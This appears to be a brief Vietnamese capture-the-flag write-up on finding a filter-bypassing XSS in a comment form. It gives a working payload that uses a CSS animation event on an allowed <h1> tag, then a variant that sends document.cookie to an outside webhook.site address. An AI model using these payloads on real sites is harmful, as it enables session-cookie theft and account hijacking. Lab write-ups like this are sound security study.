![[Pasted image 20261014163549.png]]

For prompt resolution :))


![[Pasted image 20261014163928.png]]

Trang web chỉ có một chức năng duy nhất là Post một comment lên. Mình không tìm thấy chức năng nào khác nữa.

Đến đây thì mình đoán ngay đây là dạng lỗ hỏng XSS.

![[Pasted image 20261014164503.png]]


Đến đây mình thấy công việc khá đơn giản và rõ ràng là chỉ cần brute-force thử xem tag nào cho phép chèn vào là xong.

Mình lấy danh sách các tag từ: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet Cheat sheet của Port Swigger.


Khi biết `<h1>` được cho phép, mình tìm được payload và kích hoạt thành công XSS:
```html
<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="alert(1)"></h1>
```
![[Pasted image 20261014170005.png]]

Giờ mình đổi 
https://webhook.site/da9264dd-dd7f-4d06-998c-101ab2607e66

```html
<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="location = 'https://webhook.site/da9264dd-dd7f-4d06-998c-101ab2607e66/'+document.cookie"></h1>
```
